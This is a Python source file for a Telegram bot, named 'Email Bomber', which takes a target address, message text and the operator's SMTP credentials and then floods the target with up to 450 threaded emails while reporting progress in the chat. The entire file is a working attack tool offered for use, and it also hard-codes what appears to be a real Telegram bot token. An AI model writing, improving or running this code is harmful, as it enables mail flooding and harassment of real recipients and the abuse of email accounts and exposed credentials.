import smtplib
import threading
import telebot
import time
from email.utils import formataddr

bot = telebot.TeleBot("6138199032:AAED2by4VqEeLHWoEnoXsyWQuM7-W1YAD1M")

user_context = {}


class EmailBomber:
    def __init__(self, target, amount, server, port, from_addr, from_pwd, chat_id):
        self.target = target
        self.amount = amount
        self.server = server
        self.port = port
        self.from_addr = from_addr
        self.from_pwd = from_pwd
        self.chat_id = chat_id

    def send_email(self, index, subject, sender_name, message):
        try:
            with smtplib.SMTP(self.server, self.port) as s:
                s.starttls()
                s.login(self.from_addr, self.from_pwd)

                subject = f'{subject} ({index + 1})'
                msg = f'''From: {formataddr((sender_name, self.from_addr))}\nTo: {self.target}\nSubject: {subject}\n\n{message}\n'''
                s.sendmail(self.from_addr, self.target, msg.encode('utf-8'))

                # Send progress update to Telegram
                progress = f"Sent email {index + 1} of {self.amount}"
                send_progress_message(self.chat_id, progress)
        except smtplib.SMTPException as e:
            send_error_message(self.chat_id, f'BOMB failed: {e}')

    def attack(self, num_threads, sleep_time, subject, sender_name, message):
        try:
            threads = []

            amount = int(self.amount)  # Convert the amount to an integer

            for i in range(amount):
                if i % num_threads == 0 and i != 0:
                    for t in threads:
                        t.join()
                    threads.clear()

                t = threading.Thread(target=self.send_email, args=(i, subject, sender_name, message))
                t.start()
                threads.append(t)
                time.sleep(sleep_time)

            for t in threads:
                t.join()

            print('\nAttack finished. DONE')
            send_bombing_complete_message(self.chat_id)  # Notify bombing complete
        except Exception as e:
            send_error_message(self.chat_id, f'ERROR: {e}')
            exit(1)


def send_progress_message(chat_id, progress):
    if chat_id in user_context and 'progress_message_id' in user_context[chat_id]:
        message_id = user_context[chat_id]['progress_message_id']
        bot.edit_message_text(chat_id=chat_id, message_id=message_id, text=progress)
    else:
        message = bot.send_message(chat_id, progress)
        user_context[chat_id]['progress_message_id'] = message.message_id


@bot.message_handler(commands=['start'])
def start(message):
    chat_id = message.chat.id

    user_context[chat_id] = {}

    reply = "Welcome to Email Bomber bot!\n\nThis bot allows you to send a large number of emails to a target email address.\n\nTo start the email bombing attack, use the /bomb command."
    bot.send_message(chat_id, reply)


@bot.message_handler(commands=['bomb'])
def bomb(message):
    chat_id = message.chat.id

    if 'server' not in user_context[chat_id] or 'port' not in user_context[chat_id] \
            or 'from_addr' not in user_context[chat_id] or 'from_pwd' not in user_context[chat_id]:
        reply = "Please configure the email bombing settings first in the /settings menu."
        bot.send_message(chat_id, reply)
    else:
        try:
            reply = "Enter the target email address:"
            bot.send_message(chat_id, reply)
            bot.register_next_step_handler(message, set_target)
        except Exception as e:
            send_error_message(chat_id, str(e))


def set_target(message):
    chat_id = message.chat.id
    target = message.text

    user_context[chat_id]['target'] = target

    reply = "Enter the sender's name:"
    bot.send_message(chat_id, reply)
    bot.register_next_step_handler(message, set_sender_name)


def set_sender_name(message):
    chat_id = message.chat.id
    sender_name = message.text

    user_context[chat_id]['sender_name'] = sender_name

    reply = "Enter the email subject:"
    bot.send_message(chat_id, reply)
    bot.register_next_step_handler(message, set_subject)


def set_subject(message):
    chat_id = message.chat.id
    subject = message.text

    user_context[chat_id]['subject'] = subject

    reply = "Enter the email message:"
    bot.send_message(chat_id, reply)
    bot.register_next_step_handler(message, set_message)


def set_message(message):
    chat_id = message.chat.id
    message_text = message.text

    user_context[chat_id]['message'] = message_text

    reply = "Enter the amount of emails to send (maximum: 450):"
    bot.send_message(chat_id, reply)
    bot.register_next_step_handler(message, set_amount)


def set_amount(message):
    chat_id = message.chat.id
    amount = message.text

    if not amount.isdigit() or int(amount) <= 0:
        reply = "Invalid amount. Please enter a positive number."
        bot.send_message(chat_id, reply)
        bot.register_next_step_handler(message, set_amount)
        return

    amount = min(int(amount), 450)  # Maximum of 450 emails

    user_context[chat_id]['amount'] = amount

    sleep_time = 2.0  # Default sleep time

    user_context[chat_id]['sleep_time'] = sleep_time

    reply = "Enter '1' to start the bombing attack."
    bot.send_message(chat_id, reply)
    bot.register_next_step_handler(message, confirm_attack)


def confirm_attack(message):
    chat_id = message.chat.id
    choice = message.text

    if choice == '1':
        if 'target' not in user_context[chat_id]:
            reply = "Please configure the target email address first."
        elif 'server' not in user_context[chat_id] or 'port' not in user_context[chat_id] \
                or 'from_addr' not in user_context[chat_id] or 'from_pwd' not in user_context[chat_id]:
            reply = "Please configure the email bombing settings first in the /settings menu."
        else:
            target = user_context[chat_id]['target']
            amount = user_context[chat_id]['amount']
            server = user_context[chat_id]['server']
            port = user_context[chat_id]['port']
            from_addr = user_context[chat_id]['from_addr']
            from_pwd = user_context[chat_id]['from_pwd']

            if 'subject' in user_context[chat_id] and 'sender_name' in user_context[chat_id] and 'message' in user_context[chat_id]:
                subject = user_context[chat_id]['subject']
                sender_name = user_context[chat_id]['sender_name']
                message_text = user_context[chat_id]['message']

                # Provide the 'from_pwd' argument when creating the EmailBomber object
                bomber = EmailBomber(target, amount, server, port, from_addr, from_pwd, chat_id)
                t = threading.Thread(target=bomber.attack, args=(1, 0, subject, sender_name, message_text))
                t.start()

                reply = "Email bombing attack started. You will be notified when the attack is completed."
            else:
                reply = "Please configure the email bombing settings first in the /settings menu."
    else:
        reply = "Invalid choice. Please try again."

    bot.send_message(chat_id, reply)


@bot.message_handler(commands=['settings'])
def settings(message):
    chat_id = message.chat.id

    try:
        if 'server' in user_context[chat_id] and 'port' in user_context[chat_id]:
           reply = "SMTP settings:\n1: Add SMTP\n2: Edit SMTP\n3: Show SMTP"
        else:
            reply = "SMTP settings:\n1: Add SMTP\n2: Edit SMTP\n3: Show SMTP"

        bot.send_message(chat_id, reply)
        bot.register_next_step_handler(message, handle_settings_choice)
    except Exception as e:
        send_error_message(chat_id, str(e))


def handle_settings_choice(message):
    chat_id = message.chat.id
    choice = message.text

    if choice == '1':
        bot.send_message(chat_id, "Enter the SMTP server:")
        bot.register_next_step_handler(message, set_smtp_server)
    elif choice == '2':
        if 'server' in user_context[chat_id] and 'port' in user_context[chat_id]:
            bot.send_message(chat_id, "Enter the new SMTP server:")
            bot.register_next_step_handler(message, set_smtp_server)
        else:
            reply = "SMTP server and port are not configured. Please configure the email bombing settings first."
            bot.send_message(chat_id, reply)
    elif choice == '3':
        if 'server' in user_context[chat_id] and 'port' in user_context[chat_id]:
            server = user_context[chat_id]['server']
            port = user_context[chat_id]['port']
            from_addr = user_context[chat_id]['from_addr']
            reply = f"Server: {server}\nLog: {from_addr}\nPort: {port}\n\nYou can /bomb or go to /settings"
        else:
            reply = "SMTP server and port are not configured. Please configure the email bombing settings first."
        bot.send_message(chat_id, reply)
    else:
        reply = "Invalid choice. Please try again."
        bot.send_message(chat_id, reply)
        bot.register_next_step_handler(message, handle_settings_choice)


def set_smtp_server(message):
    chat_id = message.chat.id
    server = message.text

    user_context[chat_id]['server'] = server

    bot.send_message(chat_id, "Enter the SMTP port:")
    bot.register_next_step_handler(message, set_smtp_port)


def set_smtp_port(message):
    chat_id = message.chat.id
    port = message.text

    user_context[chat_id]['port'] = port

    bot.send_message(chat_id, "Enter your email address:")
    bot.register_next_step_handler(message, set_from_addr)


def set_from_addr(message):
    chat_id = message.chat.id
    from_addr = message.text

    user_context[chat_id]['from_addr'] = from_addr

    bot.send_message(chat_id, "Enter your email password:")
    bot.register_next_step_handler(message, set_from_pwd)


def set_from_pwd(message):
    chat_id = message.chat.id
    from_pwd = message.text

    user_context[chat_id]['from_pwd'] = from_pwd

    server = user_context[chat_id]['server']
    port = user_context[chat_id]['port']
    from_addr = user_context[chat_id]['from_addr']
    reply = f"SMTPsuccessfully configured.\n\nServer: {server}\nLog: {from_addr}\nPort: {port}\n\nYou can /bomb or go to /settings"
    bot.send_message(chat_id, reply)


def send_bombing_complete_message(chat_id):
    reply = "Email bombing attack completed."
    bot.send_message(chat_id, reply)

def send_error_message(chat_id, error_message):
    bot.send_message(chat_id, f"An error occurred.\nERROR: {error_message}")

    # Notify the user that an error has occurred
    bot.send_message(chat_id, "An error occurred.")


bot.polling()
